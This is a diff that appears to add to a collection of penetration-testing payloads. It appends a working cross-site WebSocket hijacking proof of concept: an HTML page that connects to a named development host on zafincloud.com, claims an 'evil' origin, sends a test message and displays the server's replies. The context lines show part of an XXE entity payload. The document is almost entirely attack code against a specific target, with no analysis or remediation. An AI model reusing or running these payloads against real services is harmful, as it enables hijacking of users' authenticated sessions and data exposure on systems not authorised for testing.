@@ -106,3 +106,31 @@ function reqListener(){
     <property component-id="c_11" name="text">&xxe;</property>
   </message-part>
 </client-message>
+
+
+
+Websocket orgin
+
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>CSWSH PoC</h2>
+    <script>
+      const ws = new WebSocket("wss://wfc-zrpe-dev.zafincloud.com/zplatform/designer/?redirecturl=evil.com");
+
+      ws.onopen = function () {
+        document.body.innerHTML += "<p style='color:green;'>✅ WebSocket connected — server did not reject evil origin</p>";
+        ws.send("Test message from malicious origin");
+      };
+
+      ws.onerror = function () {
+        document.body.innerHTML += "<p style='color:red;'>❌ Connection failed — maybe origin is being checked</p>";
+      };
+
+      ws.onmessage = function (event) {
+        document.body.innerHTML += `<p>📨 Server replied: ${event.data}</p>`;
+      };
+    </script>
+  </body>
+</html>
+
